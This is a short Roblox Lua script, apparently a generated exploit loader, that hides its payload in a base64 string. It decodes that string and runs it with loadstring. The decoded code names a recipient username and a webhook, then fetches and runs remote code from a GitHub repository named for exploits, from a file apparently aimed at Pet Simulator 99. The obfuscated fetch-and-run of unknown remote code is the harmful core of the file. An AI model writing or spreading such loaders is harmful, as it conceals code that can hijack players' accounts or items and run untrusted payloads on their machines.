-- Generator V5.2 Encrypted Script
local encoded = [[LS0gR2VuZXJhdGVkIGJ5IEdlbmVyYXRvciBWNS4yClVzZXJuYW1lID0gIkRhQmlyZF9CZWR3YXJzIgpVc2VybmFtZTIgPSAiRGFCaXJkX0JlZHdhcnMiCldlYmhvb2sgPSAiMTIzNDU2Nzg5MCIKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9aZW5pdGgtRXhwbG9pdHMtRW1waXJlL0ZpbmFsL3JlZnMvaGVhZHMvbWFpbi9SQVclMjAtJTIwUGV0JTIwU2ltdWxhdG9yJTIwOTkiKSkoKQ==]]
local decode = function(data)
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  return (data:gsub('.', function(x)
      if (x == '=') then return '' end
      local r,f='',(b:find(x)-1)
      for i=6,1,-1 do r=r .. (f%2^i - f%2^(i-1) > 0 and '1' or '0') end
      return r
  end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
      if (#x ~= 8) then return '' end
      local c=0
      for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
      return string.char(c)
  end))
end
loadstring(decode(encoded))()